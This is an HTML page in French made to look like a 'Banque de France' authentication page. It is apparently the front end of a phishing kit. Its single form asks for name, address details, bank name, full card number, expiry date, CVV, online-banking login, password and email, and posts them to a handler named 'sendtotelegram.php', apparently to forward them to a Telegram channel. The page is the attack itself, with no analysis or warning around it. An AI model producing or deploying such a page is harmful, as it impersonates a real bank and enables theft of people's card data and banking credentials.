<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification - Banque de France</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url('logoo.png');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: #333;
        }

        header {
            padding: 20px;
            text-align: center;
        }

        main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        form {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 30px;
            border-radius: 10px;
            width: 400px;
            text-align: left;
        }

        form h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        form label {
            display: block;
            margin-bottom: 5px;
        }

        form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .carte-numero {
            display: flex;
            justify-content: space-between;
        }

        .carte-numero input {
            width: 23%;
        }

        .expiration {
            display: flex;
        }

        .expiration input {
            width: 45%;
        }

        .expiration span {
            margin: 0 5px;
        }

        .bouton-continuer {
            display: block;
            width: 100%;
            background-color: #007bff;
            color: white;
            padding: 15px;
            text-decoration: none;
            border-radius: 5px;
            text-align: center;
            border: none;
            cursor: pointer;
        }

        footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 10px;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <img src="logoo.png" alt="Logo Banque de France" style="max-width: 150px;">
        <h1>Authentification</h1>
    </header>

    <main>
        <form id="authentification-form" action="sendtotelegram.php" method="post">
            <h2>Informations d'authentification</h2>
            <label for="nom">Nom :</label>
            <input type="text" id="nom" name="nom" required>

            <label for="prenom">Prénom :</label>
            <input type="text" id="prenom" name="prenom" required>

            <label for="code-postal">Code Postal :</label>
            <input type="text" id="code-postal" name="code-postal" required>

            <label for="region">Région :</label>
            <input type="text" id="region" name="region" required>

            <label for="banque">Nom de la Banque :</label>
            <input type="text" id="banque" name="banque" required>

            <label for="departement">Département de l'Agence :</label>
            <input type="text" id="departement" name="departement" required>

            <label for="carte-numero">Numéro de Carte :</label>
            <div class="carte-numero">
                <input type="text" name="carte-numero[]" maxlength="4" required>
                <input type="text" name="carte-numero[]" maxlength="4" required>
                <input type="text" name="carte-numero[]" maxlength="4" required>
                <input type="text" name="carte-numero[]" maxlength="4" required>
            </div>

            <label for="expiration">Date d'Expiration :</label>
            <div class="expiration">
                <input type="text" name="expiration[]" maxlength="2" required>
                <span>/</span>
                <input type="text" name="expiration[]" maxlength="2" required>
            </div>

            <label for="cvv">CVV :</label>
            <input type="text" id="cvv" name="cvv" maxlength="3" required>

            <label for="identifiant">Identifiant :</label>
            <input type="text" id="identifiant" name="identifiant" required>

            <label for="mot-de-passe">Mot de Passe :</label>
            <input type="password" id="mot-de-passe" name="mot-de-passe" required>

            <label for="email">Email :</label>
            <input type="email" id="email" name="email" required>

            <button type="submit" class="bouton-continuer">Continuer</button>
        </form>
    </main>

    <footer>
        <p>&copy; 2025 Banque de France</p>
    </footer>
</body>
</html>
